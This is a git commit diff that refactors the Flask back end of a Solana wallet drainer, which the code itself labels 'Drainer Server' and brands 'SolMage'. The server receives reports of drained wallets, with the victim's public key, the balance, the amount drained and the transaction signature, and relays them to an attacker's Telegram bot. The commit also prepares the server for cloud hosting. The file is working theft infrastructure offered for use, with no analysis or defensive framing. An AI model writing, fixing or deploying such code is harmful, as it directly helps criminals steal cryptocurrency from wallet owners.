b8299906017622b9996966e2421dcb17b5f4fa7f
Eido <easyadra@gmail.com>
2025-10-06 21:00:51 +0300

    Update server.py

--- python-server/server.py
+++ python-server/server.py
@@ -1,20 +1,20 @@
+import os
 import requests
-
 from flask import Flask, jsonify, request
 from flask_cors import CORS
-
 from json import loads
 from os.path import exists as fileExists
-
 from argparse import ArgumentParser
 
+# ------------------------
+# Argument Parsing
+# ------------------------
 parser = ArgumentParser(
-    prog = 'Drainer Server',
-    description = 'Server That Receives Information From The Drainer'
+    prog='Drainer Server',
+    description='Server That Receives Information From The Drainer'
 )
-parser.add_argument('-c', '--config', help = 'Path To Configuration File')
-parser.add_argument('-t', '--telegram', help = 'Path To Telegram Configuration File')
-
+parser.add_argument('-c', '--config', help='Path To Configuration File')
+parser.add_argument('-t', '--telegram', help='Path To Telegram Configuration File')
 args = parser.parse_args()
 
 if not fileExists(args.config):
@@ -30,41 +30,56 @@ teleConfig = loads(open(args.telegram, 'r').read())
 
 botToken = teleConfig['botToken']
 chatId = teleConfig['chatId']
-url = 'https://api.telegram.org/bot{}/sendMessage'.format(botToken)
+url = f'https://api.telegram.org/bot{botToken}/sendMessage'
 
+# ------------------------
+# Telegram Helper
+# ------------------------
 def sendToTelegram(data):
-
     balance = data['balance']
     drained = data['drained']
     senderPubKey = data['senderPubKey']
     receiverPubKey = data['receiverPubKey']
     signature = data['signature']
 
-    message = f'🎩 SolMage - Report 🎩\nBalance: {balance} Lamports (**{(balance / 10**9)}** SOL)\nDrained: {drained} Lamports (**{(drained / 10**9)}** SOL)\nSender: {senderPubKey}\n\nReceiver: {receiverPubKey}\n\nTransaction ID: ```{signature}```\n\nView Transaction: https://explorer.solana.com/tx/{signature}'
-    req = requests.get(url, params = { 'chat_id': chatId, 'text': message })
+    message = (
+        f'🎩 SolMage - Report 🎩\n'
+        f'Balance: {balance} Lamports (**{balance / 10**9}** SOL)\n'
+        f'Drained: {drained} Lamports (**{drained / 10**9}** SOL)\n'
+        f'Sender: {senderPubKey}\n\n'
+        f'Receiver: {receiverPubKey}\n\n'
+        f'Transaction ID: ```{signature}```\n\n'
+        f'View Transaction: https://explorer.solana.com/tx/{signature}'
+    )
 
-    return (req.status_code == 200) 
+    req = requests.get(url, params={'chat_id': chatId, 'text': message})
+    return req.status_code == 200
 
+# ------------------------
+# Flask App
+# ------------------------
 app = Flask(__name__)
 CORS(app)
 
 @app.route('/')
 def main():
-    return jsonify({ 'Up': True })
+    return jsonify({'Up': True})
 
-@app.route(config['endpoint'], methods = ['POST'])
+@app.route(config['endpoint'], methods=['POST'])
 def sendData():
-    if request.method == 'POST':
-        reqData = request.json
-        sentLog = sendToTelegram(reqData)
+    reqData = request.json
+    sentLog = sendToTelegram(reqData)
 
-        if (sentLog):
-            print('Sent log successfully.')
-            
-        else:
-            print('Failed to send log.')
-        
-        return jsonify({'success': sentLog})
+    if sentLog:
+        print('Sent log successfully.')
+    else:
+        print('Failed to send log.')
 
+    return jsonify({'success': sentLog})
 
-app.run(host = config['host'], port = config['port'], debug = True)
+# ------------------------
+# Run Server
+# ------------------------
+host = '0.0.0.0'  # Bind to all interfaces for Render
+port = int(os.environ.get('PORT', config['port']))  # Use Render's PORT if available
+app.run(host=host, port=port, debug=True)
